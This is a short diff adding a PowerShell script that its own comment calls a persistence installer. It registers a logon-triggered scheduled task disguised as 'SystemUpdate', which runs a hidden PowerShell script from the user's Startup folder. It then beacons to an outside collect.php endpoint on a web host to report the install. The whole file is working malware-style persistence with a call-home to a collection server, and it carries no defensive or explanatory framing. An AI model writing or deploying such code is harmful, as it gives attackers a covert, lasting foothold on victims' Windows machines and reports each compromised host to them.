@@ -1,0 +1,10 @@
+# Persistence installer for scheduled task
+# Notifies your endpoint on install
+
+$taskName = "SystemUpdate"
+$scriptPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup\update.ps1"
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -File `\"$scriptPath`\""
+$trigger = New-ScheduledTaskTrigger -AtLogOn
+Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Force
+$uri = "https://personfu.github.io/CyberWorld_login/collect.php"
+Invoke-WebRequest -Uri $uri -Method POST -Body @{event="scheduled_task_installed"; task=$taskName} -UseBasicParsing
